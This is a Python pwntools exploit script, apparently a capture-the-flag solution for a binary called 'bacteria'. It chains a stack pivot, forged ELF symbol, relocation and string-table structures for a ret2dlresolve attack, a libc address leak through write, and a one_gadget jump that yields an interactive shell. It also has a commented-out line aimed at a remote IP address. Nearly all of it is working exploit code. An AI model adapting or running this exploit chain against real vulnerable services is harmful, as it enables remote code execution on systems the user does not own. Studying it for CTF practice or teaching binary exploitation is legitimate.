import subprocess
import time
from pwn import *

context.binary = exe = ELF('./bacteria', checksec=False)
# context.log_level = 'debug'

def GDB():
	proc = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
	ps = proc.stdout.read().split(b'\n')
	pid = ''
	for i in ps:
		if b'/home/bacteria/bacteria' in i and b'timeout' not in i:
			pid = i.split(b'    ')[1].split(b'  ')[0].decode()
			log.info('Process pid: ' + str(pid))

	command = '''
	b*0x401040
	c
	c
	c
	c
set $JMPREL = 0x400300
set $SYMTAB = 0x400290
set $STRTAB = 0x4002c0
set $reloc_arg = 632
x/3xg $JMPREL + $reloc_arg*24
x/3xg $SYMTAB + ( 0x0000027a00000007 >> 32 )*24
x/s $STRTAB + 0x3bc0
	'''
	with open('/tmp/command.gdb', 'wt') as f:
	        f.write(command)
	subprocess.Popen(['sudo', '/usr/bin/x-terminal-emulator', '--geometry', '960x1080+960+0', '-e', 'gdb', '-p', pid, '-x', '/tmp/command.gdb'])
	input()         # input() to make program wait with gdb
p = connect('127.0.0.1', 9487)

# p = connect('34.81.158.137', 9487)

# GDB()

############################
### Stage 1: Stack pivot ###
############################
rw_section = 0x403e00
mov_rsi_rbp_read = 0x401027

payload = p64(rw_section - 0x10)    # Fake rbp
payload += p64(mov_rsi_rbp_read)    # rip
payload += p64(0)*2                 # Just for padding so that we don't need to sleep()
p.send(payload)

########################################################
### Stage 2: Fake address and structure of Elf64_Sym ###
########################################################
SYMTAB = 0x400290

Elf64_Sym_addr = rw_section
symbol_number  = int( (Elf64_Sym_addr - SYMTAB) / 24 )

st_name = p32(15296)        # Change here
st_info = p8(0x12)
st_other = p8(0)
st_shndx = p16(0)
st_value = p64(0)
# st_size is null already because the stack now contain all null byte
# so we don't need to write these variable, just need to pad full 0x10 
# bytes so that we don't need to sleep()
Elf64_Sym_struct = st_name + st_info + st_other + st_shndx + st_value

#########################################################
### Stage 3: Fake address and structure of Elf64_Rela ###
#########################################################
JMPREL = 0x400300

Elf64_Rela_addr = rw_section + 0x40
reloc_arg = int( (Elf64_Rela_addr - JMPREL) / 24 )

r_offset = p64(rw_section - 0x50)         # Change here
r_info = p64((symbol_number << 32) | 0x7)
# r_addend is null and stack is null already so we don't need to write this, 
# also because we run out of 0x10 bytes we can write
Elf64_Rela_struct = r_offset + r_info

#####################################################
### Stage 4: Fake address and structure of STRTAB ###
#####################################################
STRTAB = 0x4002c0

STRTAB_addr = rw_section + 0x80
st_name = STRTAB_addr - STRTAB

STRTAB_struct = b"write\x00\x00\x00"
STRTAB_struct += p64(0)

##########################################################
### Stage 5. Conduct ret2dlresolve & Leak libc address ###
##########################################################
# Write Elf64_Sym structure
payload = p64(Elf64_Rela_addr - 0x10)    # Fake rbp, write and jump to Elf64_Rela address
payload += p64(mov_rsi_rbp_read)
payload += Elf64_Sym_struct
p.send(payload)

# Write Elf64_Rela structure
payload = p64(STRTAB_addr - 0x10)        # Fake rbp, write and jump to STRTAB address
payload += p64(mov_rsi_rbp_read)
payload += Elf64_Rela_struct
p.send(payload)

# Write STRTAB structure
payload = p64(rw_section - 0x50)         # Fake rbp, write and jump to ret2dlresolve address
payload += p64(mov_rsi_rbp_read)
payload += STRTAB_struct
p.send(payload)

# print(reloc_arg)                       # Using GDB to check

# Conduct ret2dlresolve
dlresolver = 0x401000
payload = p64(rw_section)
payload += p64(dlresolver)
payload += p64(reloc_arg)
payload += p64(mov_rsi_rbp_read)
p.send(payload)

# Get leaked address
write_addr = u64(p.recv(8))
log.success('Leak address: ' + hex(write_addr))
libc_base = write_addr - 0x1111d0
log.success('Libc base: ' + hex(libc_base))

#########################
### Stage 6: Get flag ###
#########################
one_gadget = 0xe6c7e
xor_r12_pop_r12 = 0xd31f0

payload = p64(0)                               # Fake rbp, not use more
payload += p64(libc_base + xor_r12_pop_r12)    # rip
payload += p64(0)                              # For that pop r12
payload += p64(libc_base + one_gadget)
p.send(payload)

p.interactive()